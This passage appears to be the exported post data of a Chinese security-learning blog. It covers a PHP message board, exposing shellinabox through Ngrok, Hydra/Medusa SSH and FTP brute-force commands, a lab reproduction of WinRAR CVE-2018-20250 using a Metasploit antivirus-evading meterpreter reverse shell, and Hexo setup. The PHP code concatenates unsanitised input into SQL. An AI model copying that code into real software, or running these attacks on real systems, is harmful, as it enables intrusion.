&quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类 上图左边是MessageBoard类的结构。MessageBoard类包含1个属性，messages。messages的数据类型是数组，其中存放了所有的留言。MessageBoard类包含5个方法，showForm()、saveData()、loadData()、showAllMessages()、showForm()。这5个方法的具体作用写在下面。 2.1显示页面2.1.1showForm()1234567function showForm()&#123; echo &quot;&lt;form action=&apos; &apos; method=&apos;POST&apos;&gt;&quot;; echo &quot;Name: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;userName&apos;&gt;&quot;.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;content&apos;&gt;&quot;; echo &quot;&lt;input type=&apos;submit&apos;&gt;&quot;; echo &quot;&lt;/form&gt;&quot;; &#125; showForm()方法用于显示留言板的表单，通过echo输出HTML语句标签显示表单，表单提交的方式为POST。 2.1.2showAllMessages()12345function showAllMessages()&#123; foreach($this-&gt;messages as $m)&#123; $m-&gt;show(); &#125; &#125; showAllMessages()方法用于输出留言内容。上面说过messages的数据类型是数组，所以使用foreach()循环输出数组内容，messages中的元素属于Message类，所以使用自身的方法show()来显示留言内容。 2.2留言的接收和读取2.2.1receiveMessage()12345function receiveMessage()&#123; if (count($_POST)!=0)&#123; $this-&gt;saveData($_POST[&apos;userName&apos;],date(&quot;Y-M-D h:i:s&quot;,time()),$_POST[&apos;content&apos;]); &#125; &#125; receiveMessage()方法用于接收留言，如果收到留言则使用saveData()方法将留言存储起来。 2.2.2saveData()12345function saveData($u,$t,$c)&#123; echo &quot;UserName: &quot;.$u.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$t.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$c.&quot;&lt;br /&gt;&quot;; &#125; 此时的saveData()方法只是用于测试整个留言板是否正常工作，还没有连接数据库，所以无法将数据存储在数据库中。只是将要存储的内容显示在页面上。 2.2.3loadData()123456function loadData()&#123; $temp=new Message(&quot;chessur&quot;,&quot;2019.3.26&quot;,&quot;Hello World!&quot;); array_push($this-&gt;messages,$temp); $temp=new Message(&quot;Andy&quot;,&quot;2019.3.26&quot;,&quot;Hello chessur&quot;); array_push($this-&gt;messages,$temp); &#125; 和saveData()方法一样，此时的loadData()也只是测试阶段。使用$temp存储留言，使用array_push()函数将留言存放在messages数组中。 3.数据库数据库中的数据结构 上图的左边是DB类的结构，database属性和构造函数。具体内容写在下面。上图的右边是数据库中数据表的结构，4个字段：ID、name、time、content，分别表示留言发表顺序、留言者、留言时间、留言内容。 3.1数据库建立&amp;数据表建立使用PHPMyAdmin的图形化界面建立数据库以及数据表 3.1.1数据库建立 3.1.2数据表建立 3.2连接数据库3.2.1创建DB类1234567891011121314151617181920212223242526272829class DB&#123; public $database=null; function __construct()&#123; //connect $dbhost=&quot;localhost&quot;; //127.0.0.1 $account=&quot;root&quot;; $password=&quot;root&quot;; $this-&gt;database=mysql_connect($dbhost,$account,$password); if($this-&gt;database)&#123; echo &quot;DB connected.&quot;; &#125;else &#123; echo &quot;DB connect failed.&quot;; &#125; $result=mysql_select_db(&quot;db_messages&quot;,$this-&gt;database); if($result)&#123; echo &quot;DB select successed.&quot;; &#125;else&#123; echo &quot;DB select failled.&quot;; &#125; &#125; function __destruct()&#123; //disconnect mysql_close($this-&gt;database); &#125;&#125; DB类的两个方法分别是构造函数和析构函数。构造函数在对象实例化时执行，其中包含mySQL数据库的配置信息：IP地址、账户、密码。使用PHP自带的mysql_connect()函数连接mySQL数据库，使用PHP自带的mysql_select_db()函数选择数据库。析构函数在将对象销毁时断开与mySQL数据库的连接，同样适用了PHP自带的mysql_close()函数。 3.2.2MessageBoard继承DB1class MessageBoard extends DB 通过继承DB类，使MessageBoard类可以使用DB类中的方法和属性。 在继承父类后，子类可以使用父类的属性和方法，但是因为子类已经声明了自己的构造函数，所以无法直接继承父类的构造函数，可以使用下面的代码来继承父类的构造函数。 1parent::__construct(); 3.3数据库的读写3.3.1SQL语法1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;chessur&apos;,&apos;2019-3-24&apos;,&apos;Hello World&apos;) 1SELECT * FROM `all_messages`; INSERT INTO是向数据库中插入数据SELECT是从数据库中选择数据 3.3.2saveData()1234function saveData($u,$t,$c)&#123; $query=&quot;INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;)&quot;; mysql_query($query); &#125; 在连接了mySQL数据库后，我们可以将savaData()方法改写为真正的方法，而不再只是测试的作用。mysql_query()函数可以执行一条mySQL语句。 3.3.3loadData()123456789function loadData()&#123; $query=&quot;SELECT * FROM `all_messages`;&quot;; $result=mysql_query($query); while($row=mysql_fetch_array($result))&#123; $temp=new Message($row[&apos;name&apos;],$row[&apos;time&apos;],$row[&apos;content&apos;]); array_push($this-&gt;messages,$temp); &#125; &#125; $query中的mySQL语句是选择表中所有数据，使用mysql_query($query)找到所有数据后，将全部留言放入messages这个数组中，完成留言数据的加载。 4.mysql函数4.1mysql_query()mysql_query() 函数执行一条 MySQL 语句。 1mysql_query(query,connection) 1mysql_query($query) 4.2mysql_connect()mysql_connect() 函数打开非持久的 MySQL 连接。 1mysql_connect(server,user,pwd,newlink,clientflag) 1mysql_open($this-&gt;database) 4.3mysql_select_db()mysql_select_db() 函数设置活动的 MySQL 数据库。如果成功，则该函数返回 true。如果失败，则返回 false。 1mysql_select_db(database,connection) 1mysql_select_db(&quot;db_messages&quot;,$this-&gt;database) 4.4mysql_close()mysql_close() 函数关闭非持久的 MySQL 连接。 1mysql_close(link_identifier) 1mysql_close($this-&gt;database) 4.5mysql_fetch_array()mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 1mysql_fetch_array(data,array_type) 1mysql_fetch_array($result) 4.6SELECTSELECT 语句用于从数据库中选取数据。 1234SELECT column_name,column_nameFROM table_name;SELECT * FROM table_name; 1SELECT * FROM `all_messages`; 4.7INSERT INTO SELECTINSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。 1234567INSERT INTO table2SELECT * FROM table1;INSERT INTO table2(column_name(s))SELECT column_name(s)FROM table1; 1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;) 5.缺陷1.没有删除功能。 2.刷新页面时表单会重复提交。 3.时间显示不正确。 1234567891011121314151617181920212223242526272829303132333435363738/*date()函数参数*/d - 一个月中的第几天（从 01 到 31）D - 星期几的文本表示（用三个字母表示）j - 一个月中的第几天，不带前导零（1 到 31）l（&apos;L&apos; 的小写形式）- 星期几的完整的文本表示N - 星期几的 ISO-8601 数字格式表示（1表示Monday[星期一]，7表示Sunday[星期日]）S - 一个月中的第几天的英语序数后缀（2 个字符：st、nd、rd 或 th。与 j 搭配使用）w - 星期几的数字表示（0 表示 Sunday[星期日]，6 表示 Saturday[星期六]）z - 一年中的第几天（从 0 到 365）W - 用 ISO-8601 数字格式表示一年中的星期数字（每周从 Monday[星期一]开始）F - 月份的完整的文本表示（January[一月份] 到 December[十二月份]）m - 月份的数字表示（从 01 到 12）M - 月份的短文本表示（用三个字母表示）n - 月份的数字表示，不带前导零（1 到 12）t - 给定月份中包含的天数L - 是否是闰年（如果是闰年则为 1，否则为 0）o - ISO-8601 标准下的年份数字Y - 年份的四位数表示y - 年份的两位数表示a - 小写形式表示：am 或 pmA - 大写形式表示：AM 或 PMB - Swatch Internet Time（000 到 999）g - 12 小时制，不带前导零（1 到 12）G - 24 小时制，不带前导零（0 到 23）h - 12 小时制，带前导零（01 到 12）H - 24 小时制，带前导零（00 到 23）i - 分，带前导零（00 到 59）s - 秒，带前导零（00 到 59）u - 微秒（PHP 5.2.2 中新增的）e - 时区标识符（例如：UTC、GMT、Atlantic/Azores）I（i 的大写形式）- 日期是否是在夏令时（如果是夏令时则为 1，否则为 0）O - 格林威治时间（GMT）的差值，单位是小时（实例：+0100）P - 格林威治时间（GMT）的差值，单位是 hours:minutes（PHP 5.1.3 中新增的）T - 时区的简写（实例：EST、MDT）Z - 以秒为单位的时区偏移量。UTC 以西时区的偏移量为负数（-43200 到 50400）c - ISO-8601 标准的日期（例如 2013-05-05T16:34:42+00:00）r - RFC 2822 格式的日期（例如 Fri, 12 Apr 2013 12:01:05 +0200）U - 自 Unix 纪元（January 1 1970 00:00:00 GMT）以来经过的秒数 将上面代码中的h改成H即为24小时 1date(&quot;Y-m-d H:i:s&quot;,time()) 时区设置在php.ini中搜索”timezone”修改 6.参考[1] php留言板製作 [2] PHP 教程 [3] SQL 教程","categories":[],"tags":[]},{"title":"'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'","slug":"Kail-Use-Shellinabox&Ngrok","date":"2019-03-21T11:49:19.000Z","updated":"2019-07-04T11:22:30.231Z","comments":true,"path":"2019/03/21/Kail-Use-Shellinabox&Ngrok/","link":"","permalink":"https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/","excerpt":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free","text":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 3.shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is &quot;normal&quot; --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; &apos;:&apos; APP APP := &apos;LOGIN&apos; | &apos;SSH&apos; [ : &lt;host&gt; ] | USER &apos;:&apos; CWD &apos;:&apos; CMD USER := &apos;AUTH&apos; | &lt;username&gt; &apos;:&apos; &lt;groupname&gt; CWD := &apos;HOME&apos; | &lt;dir&gt; CMD := &apos;SHELL&apos; | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field &apos;X-Real-IP&apos; $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; &apos;;&apos; GROUP &#125;* GROUP := OPTION &#123; &apos;,&apos; OPTION &#125;* OPTION := &lt;label&gt; &apos;:&apos; [ &apos;-&apos; | &apos;+&apos; ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b,--background[=PIDFILE] 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 4.shellinabox启动1shellinaboxd -b -t 启动服务之后，在浏览器访问http://IP:4200默认4200端口，可以自己修改shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 5.使用Ngrok将服务映射到外网5.1建立隧道在Ngrok建立隧道，注意本地端口填写启动shellinabox的端口 5.2开启映射123unzip linux_amd64.zipcd /Desktop/linux_amd64./sunny clientid 隧道id 5.3通过外网登陆直接输入URL即可登录","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/categories/工具使用/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'Medusa和Hydra对比'","slug":"Brief-Introduction-on-Medusa&Hydra","date":"2019-03-18T11:51:27.000Z","updated":"2019-07-03T01:27:43.596Z","comments":true,"path":"2019/03/18/Brief-Introduction-on-Medusa&Hydra/","link":"","permalink":"https://chirec.github.io/2019/03/18/Brief-Introduction-on-Medusa&Hydra/","excerpt":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways.","text":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways. 2.参数介绍2.1Hydra 123456789101112131415161718192021222324252627hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]-R 恢复上一次的会话-I 忽略存在的恢复文件-S SSL连接-s 端口号-l 尝试登陆名-L 从文件中导入登录名-p 尝试密码-P 从文件中导入密码-e nsr n尝试空密码 s尝试与用户名相同的密码 r反向登陆循环-c TIME 设置尝试登陆等待时间-4 / -6 使用IPV4地址或IPV6地址-v / -V 详细信息模式/显示每次尝试的用户名+密码/调试模式-O 使用旧版本SSL v2和v3-q 不显示连接错误信息-h 帮助-M 从文件中导入服务类型-f / -F 在找到第一个账号/密码后，停止破解server 目标IPservice 支持的服务类型支持的服务类型：adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmppExamples：hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh 2.2Medusa 1234567891011121314151617181920212223242526Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]-h [TEXT] 目标IP-H [FILE] 目标主机文件-u [TEXT] 用户名-U [FILE] 用户名文件-p [TEXT] 密码-P [FILE] 密码文件-C [FILE] 组合条目文件-O [FILE] 文件日志信息-e [n/s/ns] N意为空密码，S意为密码与用户名相同-M [TEXT] 模块执行名称-m [TEXT] 传递参数到模块-d 显示所有的模块名称-n [NUM] 使用非默认端口-s 启用SSL-r [NUM] 重试间隔时间，默认为3秒-t [NUM] 设定线程数量-L 并行化，每个用户使用一个线程-f 在找到第一个账号/密码后，停止破解-q 显示模块的使用信息-v [NUM] 详细级别（0-6详细）-w [NUM] 错误调试级别（0-10）-V 显示版本-Z [TEXT] 继续扫描上一次Example：medusa -M ssh -u root -P passwd.txt -h 192.168.126.130 -f -v 6 3.实验3.1暴力破解SSH3.1.1Hydra1hydra -l chessur -P passwd.txt ssh://192.168.126.130 3.1.2Medusa1medusa -M ssh -u chessur -P passwd.txt -h 192.168.126.130 -F -v 6 3.2暴力破解FTP3.2.1Hydra1hydra -l ftp1 -P passwd.txt ssh://192.168.126.130 3.2.2Medusa1medusa -M ftp -u ftp1 -P passwd.txt -h 192.168.126.130 -f -v 6 4.总结1.Medusa比Hydra稳定，但是破解速度比较慢。 2.SSH尝试速度比FTP尝试速度慢。 3.Medusa支持参数和服务类型比Hydra少，可能是很久不更新的原因。 5.参考[1] thc-hydra-README [2] Medusa Parallel Network Login Auditor","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/categories/工具使用/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'WinRAR目录穿越漏洞复现（CVE-2018-20250）'","slug":"Writeup-on-CVE-2018-20250","date":"2019-03-15T11:25:33.000Z","updated":"2019-07-04T11:25:54.104Z","comments":true,"path":"2019/03/15/Writeup-on-CVE-2018-20250/","link":"","permalink":"https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/","excerpt":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/","text":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/ 4.漏洞复现过程4.1使用Metasploit5生成免杀Payload123456789msfconsoleuse evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.2使用exp生成恶意程序12345cd /root/Desktopgit clone https://github.com/WyAtu/CVE-2018-20250.gitcd CVE-2018-20250cp /root/.msf4/local/WinRAR.exe ./vim exp.py 将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe” 将CVE-2018-20250文件夹复制到Windows10中，执行 1python exp.py 生成恶意程序test.rar 4.3在靶机上运行恶意程序将test.rar复制到Windows7上，解压运行 4.4在Kali Linux上执行Metasploit监听1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.5控制靶机Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。 5.总结刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。 6.参考文章[1] Extracting a 19 Year Old Code Execution from WinRAR [2] WinRAR目录穿越漏洞浅析及复现（CVE-2018-20250） [3] WinRAR远程代码执行漏洞结合Metasploit+Ngrok实现远程上线","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/categories/漏洞复现/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/tags/漏洞复现/"}]},{"title":"'Hexo+GitHub搭建Blog过程'","slug":"How-to-Creat-a-Blog-with-Hexo&GitHub","date":"2019-03-14T12:43:46.000Z","updated":"2019-07-01T13:35:16.464Z","comments":true,"path":"2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","link":"","permalink":"https://chirec.github.io/2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","excerpt":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。","text":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。 3.配置SSH key运行之前安装好的cmder，输入以下命令创建SSH密钥 1ssh-keygen -t rsa -C 邮件地址 执行命令后，点击三次Enter，会生成一个名为.ssh的文件夹在用户目录下，使用记事本打开文件夹中的id_rsa.pub文件，将文件内容复制，打开GitHub主页，点击右上方头像，再点击下拉菜单中的Setting，点击左侧菜单中的SSH and GPG keys，点击右边的绿色New SSH key按钮添加新的SSH key 在Key中粘贴刚刚复制的内容，点击下方绿色Add SSH key按钮，即可完成配置SSH key。 回到cmder中，输入以下命令测试是否成功配置SSH key 1ssh -T git@github.com 提示Are you sure you want to continue connecting (yes/no)，输入yes，若看到 Hi username！You’ve successfully authenticated, but GitHub does not provide shell access. 则表示成功配置SSH key。 再输入以下命令进一步配置： 12git config --global user.name username //username即为用户名git config --global user.email email //email为创建GitHub时的邮箱 4.安装Hexo首先，在你的硬盘中创建一个存放你自己Blog文件的文件夹，如D:\\Blog，然后在cmder中输入以下代码： 1234567d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务hexo init //初始化hexo g //生成Blog文件hexo s //启动服务 执行hexo s后，可以在本地预览Blog，打开浏览器访问http://localhost:4000即可查看内容。 修改主题，首先打开cmder，然后输入以下命令，以hexo-theme-yilia为例： 12cd Bloggit clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 下载的主题会存在Blog文件夹下的themes文件下，将Blog文件夹下的_config.yml中的theme: landscape改为theme: yilia，然后执行hexo g重新生成。 注：如果使用npm下载比较慢，可以更改npm的安装源，换到国内淘宝源 1npm config set registry https://registry.npm.taobao.org 5.上传到GitHub更改配置文件_config.yml中deploy选项： 1234deploy: type: git repository: git@github.com:username/username.github.io.git branch: master 更改完成之后，在cmder中输入： 1hexo d 即可将Blog上传到GitHub。 6.写博客打开cmder，跳转到Blog的根目录，执行命令： 1hexo new &apos;name&apos; 执行成功后，会显示生成的md文件的位置，打开这个文件即可开始编写Blog，我使用的是Typora进行编写。 7.在Hexo中插入图片首先，在_config.yml中，将post_asset_folder改为true，这样设置之后，当我们执行 1hexo new &apos;New Page&apos; 后，会创建一个和文章名相同的文件夹，将要插入的图片放进这个文件夹中，图片名称不要太长，太长似乎不会正确显示。 7.1使用插件hexo-asset-image插入图片安装hexo插件 1npm install hexo-asset-image --save 安装插件之后，在生成静态页面时，插件会更新正确的图片link 使用Typora编写markdown时，可以在文件-偏好设置-图片插入-复制到指定目录中输入./${filename}就可以直接将图片放到之前生成的文件夹中 7.2使用标签插入图片1&#123;% asset_img 图片名 图片解释 %&#125; 即可插入图片 7.3 